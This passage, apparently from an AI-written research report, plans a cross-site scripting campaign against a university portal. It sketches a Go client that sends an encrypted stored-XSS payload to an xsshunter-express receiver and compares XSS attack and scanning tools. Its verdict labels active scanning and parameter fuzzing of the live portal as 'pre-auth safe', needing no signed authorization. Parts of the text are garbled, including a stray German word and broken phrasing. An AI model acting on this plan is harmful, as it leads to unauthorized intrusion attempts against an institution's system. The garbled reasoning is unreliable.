A Go client that builds a stored XSS payload, encrypts it under the AES key the portal uses (this requires either an oracle-driven key extraction or known-public test fixtures), base64-encodes the result, and submits through a post-auth form. The receiver is xsshunter-express at `https://xsshunter-express.local/fire.js` which the payload is configured to call after the encryption layer.

## 11. Chain-of-thought reasoning (cot_explicit)

| Reasoning step | Logic | Citation |
|---|---|---|
| 1. Measure F6 proof of server-side re-render | The portal renders the username after the antiforgery POST. This implies an MVC action accepts user input and reflects it. RXSS precondition: satisfied. | [7] [7] |
| 2. Confirm jQuery 1.10.2 is loaded on the login tree | jQuery 1.10.2 is older than 3.4.0 and 3.5.0, so all four relevant CVEs apply | [6] [1] [4] |
| 3. Confirm no CSP | A response without `Content-Security-Policy` means successful XSS has no browser-enforced backstop | [29] [28] [27] |
| 4. Confirm method policy | POST and PUT reply 411; everything else 404. RXSS is accessible via GET (and post-auth POST). SXSS requires letter. | measured |
| 5. Build technique universe | OWASP Filter Evasion + PortSwigger + OWASP Prevention cheat sheets cover Families A-G of RXSS and Sources-Sinks of DOM | [7] [10] [11] |
| 6. Bind tools to families | Dalfox for RXSS, BeEF for post-XSS, xsshunter-express for blind, Burp DOM Invader for DOM, ZAP DOM XSS active scan for DAST detection | [8] [3] [16] [14] [15] |
| 7. Identify NO-TOOL GAPS | jQuery version-conflict, encrypted-blob oracle, postMessage enumeration, TT bypass, CSP draft emit | gap analysis |
| 8. Disambiguate pre-auth vs letter | F6 + GET-only confirm RXSS path pre-auth; SXSS path is letter-gated | measured + brief |
| 9. State the verdict | RXSS and DOM-XSS are pre-auth reachable and the campaign absent of brief | all prior |

## 12. Comparative / cross-cutting analysis (synthesis)

The four axes on which the tool universe should be compared are: deployment mode (free/self-host/BYOK/SaaS), sink coverage (RXSS, SXSS, DOM-XSS), execution model (heuristic reflection match versus real-browser DOM verifier), and licensing.

| Axis | Dalfox | XSStrike | BeEF | xsshunter-express | interactsh | OWASP ZAP | Burp DOM Invader |
|---|---|---|---|---|---|---|---|
| License | MIT [8] | GPLv3 [3] | GPLv2 + commercial embed [19] | MIT [16] | MIT [5] | Apache 2.0 (project) | Commercial (Burp Pro paid) [14] |
| Free | Yes | Yes | Yes (with embed caveat) | Yes | Yes | Yes | No |
| Self-host | Yes | Yes | Yes | Yes (Docker, 2 GB RAM) | Yes (client + server) | Yes | N/A |
| BYOK | Yes (mix with OAST/public-char) | No | N/A | N/A | Yes | Yes | Yes |
| Sink: RXSS | Headless-verified [8] | Crawler + parsers [3] | N/A | N/A | N/A | Active scan | Manual + Repeater |
| Sink: SXSS | Parameter analysis only [8] | Reflected + DOM emphasis | N/A | Blind callbacks (post-XSS only) [16] | OOB callbacks (no XSS-find-stage) | Active scan (with auth) | Manual + Repeater |
| Sink: DOM-XSS | DOM verifier [8] | DOM scan [3] | N/A (kick-off only) | Post-exploitation only [16] | OOB only | DOM XSS active scan rule [15] | Built-in chromium instrumented [14] [33] |
| Headless | Yes (built-in chromium) | No (heuristic) | N/A | No (test browser) | No | Optional (Crawljax via AJAX Spider) | Yes (built-in) [9] [32] |

Three tensions emerge:

- **MIT vs GPL-2-with-clarifications**: Dalfox and XSStrike are at opposite ends of the licensing spectrum despite doing nearly equivalent jobs. The choice depends on the security club's preference for permissive reuse (Dalfox) versus copyleft (XSStrike).
- **Free vs paid detection depth**: OWASP ZAP's DOM XSS active scan rule is free but slower and less precise than Burp DOM Invader; for a university club's pre-auth sweep, ZAP first / Burp later is the natural cadence.
- **Self-host vs SaaS OAST**: interactsh self-host preserves forensic control; the Burp Collaborator convenience is paid. A blind SXSS campaign on the SLCM portal should self-host to keep evidence segregated.

The **non-obvious divergence** is that jQuery 1.10.2 is the login-tree user, but jQuery 3.4.1 is the rest of the site - and three of the four applicable CVEs depend on which file loads first. The login tree gets the older file, which is the file that is *vulnerable*. Documenting this is a finding on its own.

## VERDICT

**Confidence: High (overall).** Specifically:

- **RXSS: High confidence of pre-auth discovery path.** The combination of OWASP rule-set, the PortSwigger 2026 cheat sheet, the OWASP Filter Evasion cheat sheet, and Dalfox's headless verifier provides a complete, well-instrumented pre-auth attack set. The portal has no CSP, no HSTS, customErrors=Off, and an MVC5 stack that historically uses Html.Raw for any `?enc=` rendering. Given the F6 username echo finding, mindestens one RXSS sink is reachable.
- **SXSS: Medium-high confidence on *invocation*; **high confidence on **letter-needed**. The tool stack is mature (xsshunter-express + Dalfox + Burp Repeater over authenticated routes), but the SLCM portal's lack of any attacker-controllable string sink in the pre-auth surface means SXSS evidence is gated on signed-letter scope.
- **DOM-XSS: Medium confidence of pre-auth probes; high confidence of post-auth full exploit.** DOM Invader and ZAP's DOM XSS active scan rule cover the pre-auth inventorisation. The postMessage enumeration and the jQuery-1.10.2 CVE-2015-9251 path are letter-gated.

**Net assessment**: The campaign's absence of an XSS brief is a strategic gap. The pre-auth portion is closer to mastery than the post-auth portion because the post-auth surface is what determines whether the SXSS findings will reproduce. The jQuery 1.10.2 finding alone - 1.10.2 is pre-3.5.0 across three of four applicable CVEs [6] [1] [4] - is itself a deliverable.

**Pre-auth safe**: OWASP ZAP AJAX Spider on the public route tree; Dalfox headless verifier with `--mining-dom` against /Account/Login; SecurityHeaders.com / Mozilla Observatory scan; manual `enc` parameter fuzz; static parse of the JS bundle for sinks; jQuery bundle version-conflict confirmation; CSP-detector sweep.

**Letter-needed**: any stored XSS via post-auth writable string field; xsshunter-express payload fire; BeEF hook delivery; postMessage enumeration in child frames that are post-auth-only; full DOM Invader session-driving; the jQuery 1.10.2 CVE-2015-9251 ajax callback hijack executed end-to-end against authenticated origin.

## References

1. *NVD-CVE-2020-11022*. https://nvd.nist.gov/vuln/detail/cve-2020-11022
2. *GitHub - beefproject/beef: The Browser Exploitation Framework Project · GitHub*. https://github.com/beefproject/beef
3. *GitHub - s0md3v/XSStrike: Most advanced XSS scanner. · GitHub*. https://github.com/s0md3v/XSStrike
4. *Prototype Pollution in jquery | CVE-2019-11358 | Snyk*. https://security.snyk.io/vuln/SNYK-JS-JQUERY-174006
5. *GitHub - projectdiscovery/interactsh: An OOB interaction gathering server and client library · GitHub*. https://github.com/projectdiscovery/interactsh
6. *jQuery 1.10.2 Vulnerabilities: Should You Worry?*. https://safeguard.sh/resources/blog/jquery-1-10-2-vulnerabilities-should-you-still-worry
7. *Cross Site Scripting Prevention - OWASP Cheat Sheet Series*. https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
8. *GitHub - hahwul/dalfox: 🌙🦊 Dalfox is a powerful open-source XSS scanner and utility focused on automation. · GitHub*. https://github.com/hahwul/dalfox
9. *Best XSS Tools in 2026: XSStrike, Dalfox, Burp DOM Invader*. https://techearl.com/best-xss-tools-2026
10. *Cross-Site Scripting (XSS) Cheat Sheet - 2026 Edition | Web Security Academy*. https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
11. *XSS Filter Evasion - OWASP Cheat Sheet Series*. https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
12. *Exploiting PostMessage Handlers to Achieve DOM XSS*. https://www.synack.com/exploits-explained/exploiting-postmessage-handlers-dom-xss/
13. *BeEF - The Browser Exploitation Framework Project*. https://beefproject.com/
14. *DOM Invader - PortSwigger*. https://portswigger.net/burp/documentation/desktop/tools/dom-invader
15. *DOM XSS Active Scan Rule - ZAP*. https://www.zaproxy.org/docs/desktop/addons/dom-xss-active-scan-rule/
16. *GitHub - mandatoryprogrammer/xsshunter-express: An easy-to-setup version of XSS Hunter. Sets up in five minutes and requires no maintenance! · GitHub*. https://github.com/mandatoryprogrammer/xsshunter-express
17. *Dalfox vs XSStrike: Features, Integrations, Reviews (2026 ...*. https://cybersectools.com/compare/dalfox-vs-xsstrike
18. *48 Best XSStrike Alternatives & Competitors (2026 ...*. https://cybersectools.com/alternatives/xsstrike
19. *beef/doc/COPYING at master · beefproject/beef · GitHub*. https://github.com/beefproject/beef/blob/master/doc/COPYING
20. *Sources and Sinks Cheatsheet - GitHub*. https://github.com/Sivnerof/Sources-And-Sinks-Cheatsheet
21. *Unsigned Messages: PostMessage DOM XSS to Full PII ...*. https://labs.trace37.com/blog/unsigned-messages-postmessage-xss/
22. *DOM-Based XSS Sources, Sinks & Defenses Explained*. https://www.securecodinghub.com/blog/dom-based-cross-site-scripting-xss-developer-guide
23. *GitHub - zixvict001-eng/TaintSight: Passive DOM XSS ...*. https://github.com/zixvict001-eng/TaintSight
24. *javascript - Ways to circumvent the same-origin policy ...*. https://stackoverflow.com/questions/3076414/ways-to-circumvent-the-same-origin-policy
25. *Ajax | jQuery API Documentation*. https://api.jquery.com/category/ajax/
26. *Cross Domain Using CORS And JSONP - C# Corner*. https://www.c-sharpcorner.com/blogs/cross-domain-using-cors-and-jsonp
27. *Content Security Policy (CSP) Bypass - HackTricks*. https://hacktricks.wiki/en/pentesting-web/content-security-policy-csp-bypass/index.html
28. *A Bug Hunter’s Guide to CSP Bypasses (Part 1)*. https://infosecwriteups.com/a-bug-hunters-guide-to-csp-bypasses-part-1-69b606fd2699
29. *How to Fix Missing Content-Security-Policy Header (Step-by ...*. https://dev.to/guardr/how-to-fix-missing-content-security-policy-header-step-by-step-1fnf
30. *Powerful XSS Scanner · Dalfox*. https://dalfox.hahwul.com/
31. *Dalfox: Open-Source XSS Scanner in Rust | DEV.co*. https://dev.co/security/open-source/dalfox
32. *ZAP – AJAX Spider*. https://www.zaproxy.org/docs/desktop/addons/ajax-spider/
33. *DOM Invader - HackTricks*. https://hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/dom-invader.html
34. *GitHub - payload-box/xss-payload-list: This project aims to ...*. https://github.com/payload-box/xss-payload-list
35. *GitHub - Orest002/XSSPECTER: DOM & reflected XSS scanner with ...*. https://github.com/Orest002/XSSPECTER
36. *Headless Browser Scraping with Playwright and Puppeteer*. https://scrapeinfo.com/posts/headless-browser-scraping-with-playwright-and-puppeteer
